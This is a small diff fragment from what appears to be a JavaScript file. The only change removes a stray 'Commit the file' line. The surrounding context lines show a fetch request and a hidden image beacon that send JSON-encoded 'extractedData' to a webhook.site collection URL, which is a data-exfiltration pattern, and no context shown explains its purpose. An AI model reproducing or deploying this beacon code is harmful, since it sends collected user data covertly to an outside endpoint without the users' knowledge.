@@ -49,4 +49,4 @@ fetch('https://webhook.site/deb7f488-0159-4922-8dee-29f1c875e2aa', {
     const img = new Image();
     img.src = 'https://webhook.site/deb7f488-0159-4922-8dee-29f1c875e2aa?data=' + encodeURIComponent(JSON.stringify(extractedData));
 });
-Commit the file
+
